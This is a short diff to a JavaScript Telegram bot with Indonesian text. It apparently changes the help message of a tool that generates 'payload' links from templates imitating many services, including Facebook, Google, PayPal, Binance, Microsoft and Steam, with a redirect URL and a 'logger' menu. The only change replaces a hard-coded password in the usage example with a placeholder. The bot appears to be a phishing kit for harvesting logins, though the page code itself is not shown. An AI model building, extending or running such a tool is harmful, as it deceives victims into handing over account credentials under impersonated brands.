@@ -1488,7 +1488,7 @@ async function startServer() {
                 `Gunakan command berikut dengan password untuk generate link payload:\n\n` +
                 `<code>/santopetrus [PASSWORD] [TEMPLATE] [REDIRECT_URL]</code>\n\n` +
                 `<b>Contoh Penggunaan:</b>\n` +
-                `<code>/santopetrus 19281933 facebook https://google.com</code>\n\n` +
+                `<code>/santopetrus PASSWORD_ANDA facebook https://google.com</code>\n\n` +
                 `<i>Template yg tersedia: facebook, google, instagram, whatsapp, tiktok, twitter, telegram, netflix, spotify, microsoft, linkedin, github, paypal, discord, steam, reddit, binance, apple, amazon, roblox, playstation, xbox, snapchat, pinterest, twitch, canva, dropbox dll.</i>`;
       const kb = Markup.inlineKeyboard([
         [Markup.button.callback('◀️ KEMBALI', 'menu_logger')]
